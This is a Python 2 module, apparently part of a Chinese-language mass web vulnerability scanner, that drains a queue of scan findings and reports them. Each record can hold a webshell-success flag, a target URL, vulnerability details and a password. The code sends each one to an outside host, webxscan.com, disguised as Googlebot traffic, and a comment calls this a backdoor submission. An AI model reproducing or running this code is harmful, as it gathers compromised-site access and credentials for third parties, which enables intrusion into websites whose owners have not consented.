#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

import threading
import Queue
import time
import urllib2
import ConfigParser  #INI读取数据

url_root1 = Queue.Queue(3000)  #网站版本漏洞  webFTP  iis写入   CMS程序识别
url_root2 = Queue.Queue(3000)  #通用 网站漏洞  上传入口  登陆后台  敏感压缩包  表单提交  SQL注入类的
url_root3 = Queue.Queue(3000)  #服务器配置漏洞  查看开放端口和服务  ftp弱口令  mysql  sqlserver
url_root4 = Queue.Queue(3000)  #IP反查域名  子域名枚举
url_root5 = Queue.Queue(1000)  #C段扫描
url_exp= Queue.Queue(4000)  #保存扫描到的结果["127.0.0.1","admin","admin"]
class C_Queue(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.name=""
        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("server.ini"))
            self.name = config.get("DATA","name")  #测试上传文件
        except:
            print "--name-ini-try--except!!!!!"

    def print_Queue(self):
        try:
            print u"-----------------------------------------"
            print u"扫描等级url_root1--------%s个"%(url_root1.qsize())
            print u"扫描等级url_root2--------%s个"%(url_root2.qsize())
            print u"扫描等级url_root3--------%s个"%(url_root3.qsize())
            print u"扫描等级url_root4--------%s个"%(url_root4.qsize())
            print u"扫描等级url_root5--------%s个"%(url_root5.qsize())
            print u"扫描结果url_exp----------%s个"%(url_exp.qsize())
            print u"-----------------------------------------"
        except:
            return 0

    def run(self):
        try:
            while True:
                self.print_Queue()
                self.add_txt_exp_url()  #对exp_url进行存储
                time.sleep(10)
        except Exception,e:
            print e
            time.sleep(60)
            self.run()

    def add_txt_exp_url(self):
        try:
            if url_exp.empty():   #判断队列是否为空
                time.sleep(10)
                return 0
            int_exp=int(url_exp.qsize())
            for i in range(int(int_exp)):
                self.Chost = url_exp.get(0.5)  #get()方法从队头删除并返回一个项目
                if len(self.Chost)!=7:
                    print u"数据结构异常",self.Chost
                #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                #//用户名,可信度,网址,严重程度,漏洞类型,漏洞地址,密码,备注  8个
                url="http://www.webxscan.com/url_exp_user.php?" \
                    "user=%s&root=%s&url=%s&exp=%s&expr=%s&urlexp=%s&Password=%s&bz=%s"%\
                    (str(self.name),str(self.Chost[0]),str(self.Chost[1]),str(self.Chost[2]),
                     str(self.Chost[3]),str(self.Chost[4]),str(self.Chost[5]),str(self.Chost[6]))
                print url
                self.url_post(url)
                time.sleep(0.5)
        except Exception,e:
            print "---111----222---",e
            return 0

    def url_post(self,URL):
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(1)
            return 1
        except:
            return 0



